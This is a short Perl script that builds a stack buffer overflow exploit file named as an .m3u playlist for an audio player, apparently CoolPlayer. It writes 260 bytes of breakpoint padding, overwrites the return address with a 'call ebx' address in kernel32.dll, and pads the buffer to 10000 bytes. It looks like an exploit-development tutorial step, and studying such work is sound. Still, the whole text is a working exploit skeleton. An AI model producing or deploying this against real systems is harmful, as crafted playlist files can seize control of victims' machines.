#!/usr/bin/perl

my $buffsize = 10000; #set consistent buffer size
my $junk = "\xcc" x 260; #offset to EIP
my $eip = pack("V", 0x7c810395); #call ebx from kernel32.dll

my $sploit = $junk.$eip; #build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file

my $file = "coolplayerbegbuffer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer). "\n";
